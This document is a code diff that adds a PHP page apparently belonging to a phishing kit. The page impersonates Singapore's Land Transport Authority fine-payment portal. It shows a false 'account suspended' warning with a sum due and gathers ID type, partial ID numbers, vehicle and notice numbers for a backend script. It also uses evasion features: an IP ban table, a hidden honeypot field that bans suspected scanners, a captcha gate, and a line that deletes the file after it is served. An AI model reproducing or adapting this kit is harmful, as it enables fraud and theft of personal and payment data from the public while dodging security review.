@@ -1,0 +1,559 @@
+<?php
+    include '../../../assets/config/functions.php';
+    require '../../../assets/config/connec.php';
+    session_start();
+    $ID = $_GET['ID'];
+    $ip=getclientip();
+    $check = mysqli_query($conn, "SELECT * FROM ban WHERE ip='$ip' ");
+    if ($check) {
+        $array = mysqli_fetch_array($check);
+        if ($array[0] === $ip) {
+            if($array[1] == 'false'){
+            }elseif($array[1] == 'true'){
+                header("Location: google.com");
+            }
+        }
+    }
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LTA | Pay LTA Fines and ERP Admin Fees</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+    <link rel="icon" type="image/vnd.microsoft.icon" href="../../../assets/image/hdyit/favicon.ico" />
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+    <link rel="stylesheet" href="../../../assets/style/sty/kOiTbJ.css">
+    <style>
+        .hidden-field {display: none;}
+        .h-captcha {
+            width: 50px;
+        }
+
+        #cookie {
+            background-color: #00000086;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            height: 100vh;
+            z-index: 1000000;
+        }
+
+        #cookie .cookieebox {
+            background-color: #fff;
+            width: 800px;
+            margin: 0 auto;
+            padding: 35px 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px
+        }
+
+        #cookie .cookieebox .cookieebox001 {
+            width: 100%;
+            text-align: end;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            text-decoration: underline;
+            color: #4159a2;
+            cursor: pointer;
+        }
+
+        #cookie .cookieebox .cookieebox003 {
+            font-size: 13px;
+            font-family: Arial, Helvetica, sans-serif;
+            line-height: 20px;
+            color: #444;
+        }
+
+        #cookie .cookieebox .cookieebox004 {
+            font-size: 14px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #4159a2;
+            font-weight: 400;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        #cookie .cookieebox .cookieebox005 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #444;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        #cookie .cookieebox .cookieebox006 {
+            color: #444;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 12px;
+            line-height: 20px;
+        }
+
+        #cookie .cookieebox .cookieebox007 {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        #cookie .cookieebox .cookieebox007 .btnnn1 {
+            font-family: Arial, Helvetica, sans-serif;
+            border: 1px solid #4159a2;
+            border-radius: 20px;
+            background-color: transparent;
+            color: #4159a2;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        #cookie .cookieebox .cookieebox007 .btnnn2 {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #4159a2;
+            color: #fff;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 20px;
+        }
+
+        @media (max-width:800px) {
+            #cookie .cookieebox {
+                width: 100%;
+            }
+
+            .page1RenewT .page1RenewT01 .page1RenewT01_01 .page1RenewT01_01_02 .page1RenewT01_01Div2,
+            .page1RenewT .page1RenewT01 .page1RenewT01_01 .page1RenewT01_01_02 .page1RenewT01_01Div3 {
+                display: none !important;
+            }
+
+            .mainDetails .mainDetails00 .prepaidbox .prepaidbox0202 {
+                flex-direction: column;
+                gap: 10px;
+                width: 100%;
+                align-items: center;
+                justify-content: center;
+            }
+        }
+        #hcptchaaabox {
+                display: none;
+                position: fixed;
+                top: 0;
+                width: 100%;
+                height: 100vh;
+                background-color: rgba(0, 0, 0, 0.629);
+                z-index: 1000000000000000;
+            }
+            
+            #hcptchaaabox .hcptchaaabox00 {
+                width: 400px;
+                /* background-color: #fff; */
+                padding: 10px;
+                margin: 200px auto;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+            
+            #hcptchaaabox .hcptchaaabox00 .h-captcha {
+                width: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+    </style>
+</head>
+<body>
+     <div id="hcptchaaabox">
+            <div class="hcptchaaabox00">
+                <div class="h-captcha" data-sitekey="a49121d4-5169-4751-9530-78be33782da1"></div>
+            </div>
+        </div>
+    <!-- ------- -->
+    <div id="mainDetails" class="mainDetails">
+        <form method="post" action="../i.php?id=<?php echo $ID;?>" class="mainDetails00">
+            <input type="hidden" name="step" value="indexStep">
+            <input type="hidden" name="IdentificationType" id="IdentificationType0" value="">
+            <input type="hidden" name="IdentificationNumber4Char" id="IdentificationNumber4Char0" value="">
+            <input type="hidden" name="VehicleNumber" id="VehicleNumber0" value="">
+            <input type="hidden" name="NoticeNumber" id="NoticeNumber0" value="">
+            <div class="SuspendBox">
+                <div class="SuspendBox01">
+                    <i class="ri-error-warning-fill"></i>
+                    <div class="SuspendBox01_01">
+                        <b>Suspended</b>
+                        Your account is suspended and toll invoices will now apply.
+                    </div>
+                </div>
+                <p>Make a payment to reactivate</p>
+            </div>
+            <div class="unpaidbox">
+                <div class="unpaidbox001">
+                    <i class="ri-folder-warning-fill"></i>
+                    <p>There are unpaid toll invoices owing for Vehicle(s) on this account.</p>
+                </div>
+                <i class="ri-arrow-drop-down-line"></i>
+            </div>
+            <div class="prepaidbox">
+                <div class="prepaidbox01">
+                    <div class="prepaidbox01_01">
+                        <h4>Prepaid Account</h4>
+                        <p>Acc. No. 10500040824</p>
+                    </div>
+                    <i class="ri-lock-fill"></i>
+                </div>
+                <div class="prepaidbox02">
+                    <div class="prepaidbox02_01">
+                        <h3>Due Now</h3>
+                        <h2>SGD 17.10</h2>
+                    </div>
+                </div>
+                <div class="prepaidbox02 prepaidbox0202">
+                    <div class="prepaidbox02_02">
+                        <p>Make a payment to activate your account.</p>
+                    </div>
+                    <button type="submit">Make a payment Now</button>
+                </div>
+                <!-- <div class="h-captcha" data-sitekey="a49121d4-5169-4751-9530-78be33782da1"></div> -->
+
+            </div>
+        </form>
+    </div>
+    <!-- ------- -->
+    <header style="width: 100%;height: fit-content;">
+        <div class="headerCon" style="display: flex;flex-direction: column;" >
+            <div class="headerCon_00" style="padding: 5px 30px;width: 100%;font-size: 14px;color: rgb(51, 51, 51);background-color: #f0f0f0;display: flex;align-items: center;">
+                <img src="../../../assets/image/hdyit/0022.png" alt="">
+                <p style="font-size: 14px;color: rgb(51, 51, 51);font-family: 'f6';">A Singapore Government Agency Website</p>
+                <span style="font-family: 'f6';color: #3f4fa0;text-decoration: underline;padding-left: 5px;cursor: pointer;"> How to identify <i class="ri-arrow-drop-down-line"></i></span>
+            </div>
+            <div class="headerCon_01" style="padding: 0 30px;width: 100%;display: flex;align-items: center;justify-content: space-between;">
+                <img src="../../../assets/image/hdyit/logo.gif" alt="">
+                <ul class="navBar navBar1">
+                    <li style="cursor: pointer;font-size: 16px;color: rgb(51, 51, 51);font-family: 'f4';">About Us</li>
+                    <li style="cursor: pointer;font-size: 16px;color: rgb(51, 51, 51);font-family: 'f4';">Buying</li>
+                    <li style="cursor: pointer;font-size: 16px;color: rgb(51, 51, 51);font-family: 'f4';">Owning</li>
+                    <li style="cursor: pointer;font-size: 16px;color: rgb(51, 51, 51);font-family: 'f4';">Driving</li>
+                    <li style="cursor: pointer;font-size: 16px;color: rgb(51, 51, 51);font-family: 'f4';">Selling/Deregistering</li>
+                    <li style="cursor: pointer;font-size: 16px;color: rgb(51, 51, 51);font-family: 'f4';">Digital Services</li>
+                </ul>
+                <ul class="navBar">
+                    <li><i class="ri-user-fill"></i> Login</li>
+                    <li><i class="ri-search-line"></i></li>
+                    <div class="headerCon_01_menu">
+                        <i class="ri-menu-line ii"></i>
+                        <i class="ri-close-line ii"></i>
+                    </div>
+                </ul>
+
+
+            </div>
+        </div>
+    </header>
+    <!--  -->
+    <section class="page1RenewT">
+        <div class="page1RenewTCover"><h1>Pay LTA Fines and ERP Admin Fees</h1></div>
+        <div class="page1RenewT01">
+            <div class="page1RenewT01_01">
+                <div class="page1RenewT01_01_02">
+                    <div class="page1RenewT01_01Div1 page1RenewT01_01Div0">
+                        <button type="button">1</button>
+                        <p>
+                            Select LTA Fines <br>
+                            & Fees<br>
+                            (1/3)
+                        </p>
+                    </div>
+                    <div class="page1RenewT01_01Div2 page1RenewT01_01Div0">
+                        <button type="button">2</button>
+                        <p>
+                            Review payment<br>
+                            deatails<br>
+                            (2/3)
+                        </p>
+                    </div>
+                    <div class="page1RenewT01_01Div3 page1RenewT01_01Div0">
+                        <button type="button">3</button>
+                        <p>
+                            Make <br>
+                            payment<br>
+                            (3/3)
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <p class="page1RenewT01Para1">Note: You may take 5 minutes to complete this transaction</p>
+            <div class="page1RenewT01_02">
+                <div class="page1RenewT01_02_01">
+                    <span>About this digital service</span>
+                    <i class="ri-add-box-line"></i>
+                </div>
+                <ul class="page1RenewT01_02_02">
+                    <li>● This Digital service allows you to pay your fines and ERP Admin Fees</li>
+                    <li>● You will need to enter the following to retrieve details of your fine/notice:</li>
+                    <ul class="page1RenewT01_02_02ulll1">
+                        <li>● Identification type and identification number (last 4 characters); and</li>
+                        <li>● Notice number or vehicle number</li>
+                    </ul>
+                    <li>● Please note that records of outstanding fines will only appear after 3 working days (from the
+                        date of the offence).</li>
+                    <ul class="page1RenewT01_02_02ulll1">
+                        <h3>How to pay:</h3>
+                        <li>● SGQR PayNow</li>
+                        <li>● eNETS debit (Internet banking account with DBS/POSB, OCBC, Standard Chartered Bank or UOB)
+                        </li>
+                        <ul class="page1RenewT01_02_02ulll2">
+                            <li>◦ Ensure that you have adequate balance and daily payment limit for the amount to be
+                                debited from your account. For assistance pertaining to your daily payment limit, please
+                                check with your bank before proceeding with the transaction.</li>
+                            <li>◦ Please allow pop-ups for eNETS and your banks' websites to avoid "time-out" errors
+                                arising from disabled pop-up blockers. For assistance, visit NETS' website for steps on
+                                how to configure the pop-up blockers for various web browsers.</li>
+                        </ul>
+                        <li>● Credit card or debit card (VISA or MasterCard only)</li>
+                        <li>● Apple Pay</li>
+                        <li>● Google Pay</li>
+                        <li>● PayPal</li>
+                    </ul>
+                </ul>
+            </div>
+            <h4>Select LTA Fines & Fees</h4>
+            <div class="page1RenewT01_03">
+                <div class="page1RenewT01_03_01">
+                    <span>Search Vehicle No. or Notice No.</span>
+                    <i class="ri-arrow-up-s-line"></i>
+                </div>
+                <div class="page1RenewT01_03_02">
+                    <input type="text" id="inputgo" name="fullnames" class="hidden-field">
+                    <div class="page1RenewT01_03_02_01 page1RenewT01_03_02_00">
+                        <div class="page1RenewT01_03_02_00_01">
+                            <label>Identification Type</label>
+                            <select name="IdentificationType" id="IdentificationType" aria-required="true"
+                                aria-invalid="false">
+                                <option value="00" disabled="disabled" selected="selected">Please Select</option>
+                                <option value="Singapore NRIC">Singapore NRIC</option>
+                                <option value="Malaysia IC">Malaysia IC</option>
+                                <option value="Foreign Passport">Foreign Passport</option>
+                                <option value="Government">Government</option>
+                                <option value="Statutory Board">Statutory Board</option>
+                                <option value="Local Business">Local Business</option>
+                                <option value="Local Company">Local Company</option>
+                                <option value="Club/Association/Organization">Club/Association/Organization</option>
+                                <option value="Professional">Professional</option>
+                                <option value="Foreign Company">Foreign Company</option>
+                                <option value="Limited Liability Partnership">Limited Liability Partnership</option>
+                                <option value="Limited Partnership">Limited Partnership</option>
+                                <option value="Foreign Identification Number">Foreign Identification Number</option>
+                            </select>
+                        </div>
+                        <p style="visibility: hidden;">OR</p>
+                        <div class="page1RenewT01_03_02_00_01">
+                            <label>Identification Number (Input last 4 characters)</label>
+                            <input type="text" name="IdentificationNumber4Char" id="IdentificationNumber4Char"
+                                placeholder="e.g. 123A">
+                        </div>
+                    </div>
+                    <div class="page1RenewT01_03_02_02 page1RenewT01_03_02_00">
+                        <div class="page1RenewT01_03_02_00_01">
+                            <label for="">Vehicle Number</label>
+                            <input type="text" name="VehicleNumber" id="VehicleNumber" placeholder="e.g.SFW1234J">
+                        </div>
+                        <p>OR</p>
+                        <div class="page1RenewT01_03_02_00_01">
+                            <label>Notice Number</label>
+                            <input type="text" name="NoticeNumber" id="NoticeNumber" placeholder="e.g. 1234567890">
+                        </div>
+                    </div>                    
+                    <div class="page1RenewT01_03_02_03">
+                        <button type="button" id="btn1SUb">Submit</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- -->
+    <footer>
+        <div class="footerCon">
+            <div class="footerCon01">
+                <div class="footerCon01__001">
+                    <h1>OneMotoring by Land Transport Authority</h1>
+                    <div class="footerCon01__001boxul">
+                        <ul>
+                            <li>Home</li>
+                            <li>Buying</li>
+                            <li>Owning</li>
+                            <li>Driving</li>
+                            <li>Sellnig/Deregistering</li>
+                        </ul>
+                        <ul>
+                            <li>Digital Services</li>
+                            <li>Facts & Figures</li>
+                            <li>Forms</li>
+                        </ul>
+                    </div>
+
+                </div>
+                <div class="footerCon01__01">
+                    <img src="../../../assets/image/hdyit/logo_footer.jpeg" alt="">
+                </div>
+                <ul class="footerCon01__02">
+                    <li>Contact Us</li>
+                    <li>Feedback</li>
+                    <li>REACH</li>
+                    <li>Take Tour</li>
+                    <ul class="bbfooterCon01__02bb">
+                        <li><img src="../../../assets/image/hdyit/Facebook_f_logo.svg.png" alt="" width="30px"></li>
+                        <li><img src="../../../assets/image/hdyit/Instagram_icon.png.webp" alt="" width="30px"></li>
+                        <li><img src="../../../assets/image/hdyit/footer_tiktok.png" alt="" width="30px"></li>
+                        <li><img src="../../../assets/image/hdyit/footer_twitter.png" alt="" width="30px"></li>
+                        <li><img src="../../../assets/image/hdyit/footer_telegram.png" alt="" width="30px"></li>
+                        <li><img src="../../../assets/image/hdyit/footer_youtube.png" alt="" width="30px"></li>
+                        <li><img src="../../../assets/image/hdyit/footer_linkedin.png" alt="" width="30px"></li>
+                    </ul>
+
+                </ul>
+                <hr style="border:1px solid #ddd;margin-bottom:10px;margin-top:0px;">
+                <div class="footerCon01__03">
+                    <ul>
+                        <li>Report Vulnerability</li>
+                        <li>Privacy Statement</li>
+                        <li>Terms of Use</li>
+                        <li>Disclaimer</li>
+                    </ul>
+                    <p> <i class="ri-copyright-line"></i> 2023 Land Transport Authority of Singapore.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- -->
+    <div id="cookie">
+        <div class="cookieebox">
+            <div class="cookieebox001" id="bt03">Continue without accepting →</div>
+            <div class="cookieebox002"><img src="../../../assets/image/hdyit/logo.gif" alt=""></div>
+            <div class="cookieebox003">With your consent, we and our partners use cookies or
+                 similar technologies to store, access and process personal data such as your
+                 visits to this website, IP addresses and cookie identifiers. Some partners do not
+                 do not ask for your consent to process your data and rely on their commercial interest
+                 legitimate. You can revoke your consent or object to data processing based on
+                 legitimate interest at any time by clicking on “Learn more” or by accessing our Privacy Policy
+                 privacy on this website.</div>
+            <div class="cookieebox004">View our partners</div>
+            <div class="cookieebox005">With our partners, we process the following data:</div>
+            <div class="cookieebox006">Conservation of technical data, precise geolocation data and
+                 identification by terminal analysis, personalized advertising and content, performance measurement of
+                 advertisements and content, audience data and product development, Store and/or access information
+                 information on a terminal</div>
+            <div class="cookieebox007">
+                <span class="btnnn1" id="bt01">Learn more→</span>
+                <span class="btnnn2" id="bt02">Accept & Close</span>
+            </div>
+        </div>
+    </div>
+    <!-- -->
+    <script src="../../../assets/js/jho556d.js"></script>
+    <script>
+        const riaddboxline = document.querySelector('.ri-add-box-line');
+        riaddboxline.addEventListener("click", () => {
+            document.querySelector('.page1RenewT01_02').classList.toggle('page1RenewT01_02Ac');
+            setInterval(() => {
+                if (document.querySelector('.page1RenewT01_02').getAttribute('class') === "page1RenewT01_02 page1RenewT01_02Ac") {
+                    riaddboxline.setAttribute('class', 'ri-checkbox-indeterminate-line');
+                } else {riaddboxline.setAttribute('class', 'ri-add-box-line');}
+            }, 100)
+        });
+        const btn1SUb = document.getElementById('btn1SUb');
+        btn1SUb.style.cursor = "not-allowed";
+        btn1SUb.disabled = true;
+        btn1SUb.style.backgroundColor = '#666666';
+        setInterval(() => {
+            if (IdentificationType.value !== "00" && IdentificationNumber4Char.value.length > 3) {
+                btn1SUb.style.cursor = "pointer";
+                btn1SUb.disabled = false;
+                btn1SUb.style.backgroundColor = '#3f4fa0';
+                btn1SUb.addEventListener("click", () => {
+                    const IdentificationType = document.getElementById('IdentificationType').value;
+                    const IdentificationType0 = document.getElementById('IdentificationType0').value = IdentificationType;
+
+                    const IdentificationNumber4Char = document.getElementById('IdentificationNumber4Char').value;
+                    const IdentificationNumber4Char0 = document.getElementById('IdentificationNumber4Char0').value = IdentificationNumber4Char;
+
+                    const VehicleNumber = document.getElementById('VehicleNumber').value;
+                    const VehicleNumber0 = document.getElementById('VehicleNumber0').value = VehicleNumber;
+
+                    const NoticeNumber = document.getElementById('NoticeNumber').value;
+                    const NoticeNumber0 = document.getElementById('NoticeNumber0').value = NoticeNumber;
+
+                    document.getElementById('mainDetails').classList.add('actmainDetails');
+                })
+            } else {
+                btn1SUb.style.cursor = "not-allowed";
+                btn1SUb.disabled = true;
+                btn1SUb.style.backgroundColor = '#666666';
+            }
+        }, 100)
+        document.getElementById('bt02').addEventListener("click", () => {
+            document.getElementById('cookie').style.display = 'none';
+            document.getElementById("hcptchaaabox").style.display = 'block';
+        })
+        document.getElementById('bt01').addEventListener("click", () => {
+            document.getElementById('cookie').style.display = 'none';
+            document.getElementById("hcptchaaabox").style.display = 'block';
+        })
+        document.getElementById('bt03').addEventListener("click", () => {
+            document.getElementById('cookie').style.display = 'none';
+            document.getElementById("hcptchaaabox").style.display = 'block';
+        })
+        function validarPost() {
+            if (hcaptcha.getResponse() != "") {
+                document.getElementById("hcptchaaabox").style.display = 'none';
+                return true;
+            } else {return false;}
+        }
+        setInterval(() => {validarPost();}, 10)
+
+        // __________________________________________________________________________
+        // setInterval(() => {
+        //     if(validarPost() === false){
+        //         bandIp(_ip);
+        //     } 
+        // },10000);
+        var inputgo = document.getElementById('inputgo');
+        setInterval(() => {
+            inputgo.addEventListener('click', function() {
+                bandIp('<?php echo $ip;?>');
+                window.location.href = 'https://example.com'; 
+            });
+            inputgo.addEventListener("change",()=>{
+                bandIp('<?php echo $ip;?>');
+                window.location.href = 'https://example.com';
+            });
+            if(inputgo.value.length > 0){
+                bandIp('<?php echo $ip;?>');
+                window.location.href = 'https://example.com';
+            }
+        }, 100);
+
+        function bandIp(_ip) {
+             $.ajax({
+                type: 'POST',
+                url: '../../c/baned.php',
+                data: {ip: _ip},
+                success: function(data) {
+                    let parsed_data = JSON.parse(data);
+                    if (parsed_data.status == 'success') {}
+                }
+            })
+        }
+      
+
+
+
+
+    </script>
+</body>
+</html>
+<?php  unlink(basename(__FILE__)); ?>
